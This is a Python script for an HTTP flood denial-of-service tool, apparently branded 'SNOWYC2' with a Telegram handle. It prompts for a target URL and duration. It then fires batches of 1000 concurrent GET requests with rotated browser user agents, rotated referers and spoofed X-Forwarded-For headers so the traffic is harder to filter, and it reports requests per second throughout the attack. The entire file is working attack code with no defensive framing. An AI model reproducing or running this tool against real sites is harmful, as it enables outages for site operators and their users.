import asyncio
import aiohttp
import random
import sys
import os
import psutil
import time

# Configuration
MAX_CONCURRENT = 1000
REQUEST_TIMEOUT = 10
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0"
]

def load_referers():
    try:
        with open("refs.txt", "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return ["https://www.google.com/"]

class AttackEngine:
    def __init__(self, method, target, duration):
        self.method = method
        self.target = target
        self.duration = duration
        self.start_time = time.time()
        self.referers = load_referers()
        self.process = psutil.Process(os.getpid())
        self.stats = {
            'total': 0,
            'success': 0,
            'errors': 0,
            'rps': 0,
            'peak_rps': 0
        }

    async def make_request(self, session):
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Referer": random.choice(self.referers),
            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
        }
        try:
            async with session.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT) as response:
                if response.status == 200:
                    return "SUCCESS"
                elif str(response.status).startswith("4"):
                    return "ERROR"
                return "OTHER"
        except:
            return "ERROR"

    async def run_attack(self):
        end_time = self.start_time + self.duration
        conn = aiohttp.TCPConnector(limit_per_host=None)
        async with aiohttp.ClientSession(connector=conn) as session:
            while time.time() < end_time:
                tasks = [self.make_request(session) for _ in range(MAX_CONCURRENT)]
                results = await asyncio.gather(*tasks)
                self.stats['total'] += len(results)
                self.stats['success'] += results.count("SUCCESS")
                self.stats['errors'] += results.count("ERROR")
                elapsed = time.time() - self.start_time
                current_rps = self.stats['total'] / elapsed if elapsed > 0 else 0
                self.stats['rps'] = current_rps
                self.stats['peak_rps'] = max(self.stats['peak_rps'], current_rps)
                self.print_status()
                await asyncio.sleep(0.55)
        self.print_summary()

    def print_status(self):
        elapsed = time.time() - self.start_time
        remaining = max(0, self.duration - elapsed)
        ram_used_mb = self.process.memory_info().rss / 1024 / 1024
        sys.stdout.write("\033[H\033[J")
        print(f"\nSNOWYC2 - T.ME/STSVKINGDOM")
        print("=" * 60)
        print(f" METHOD: {self.method} | TARGET: {self.target} | TIME: {self.duration}s")
        print(f" REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
        print(f" RPS: {self.stats['rps']:.1f} | PEAK RPS: {self.stats['peak_rps']:.1f}")
        print(f" RAM USAGE: {ram_used_mb:.2f} MB")
        print(f" TIME REMAINING: {remaining:.1f}s")
        print("=" * 60)

    def print_summary(self):
        total_time = time.time() - self.start_time
        avg_rps = self.stats['total'] / total_time if total_time > 0 else 0
        print("\nATTACK COMPLETED")
        print("=" * 60)
        print(f" TARGET: {self.target}")
        print(f" DURATION: {total_time:.1f}s")
        print(f" TOTAL REQUESTS: {self.stats['total']}")
        print(f" SUCCESS (200): {self.stats['success']}")
        print(f" ERRORS (4xx): {self.stats['errors']}")
        print(f" AVERAGE RPS: {avg_rps:.1f}")
        print("=" * 60)

def main():
    print("\nSNOWYC2 - T.ME/STSVKINGDOM")
    print("=" * 40)
    method = "C-ECLIPSE"
    target = input("TARGET: ").strip()
    duration = int(input("TIME (seconds): ").strip())
    if not target.startswith(('http://', 'https://')):
        target = "http://" + target
    try:
        engine = AttackEngine(method, target, duration)
        asyncio.run(engine.run_attack())
    except KeyboardInterrupt:
        print("\nAttack stopped by user")
    except Exception as e:
        print(f"\nError: {e}")

if __name__ == "__main__":
    main()
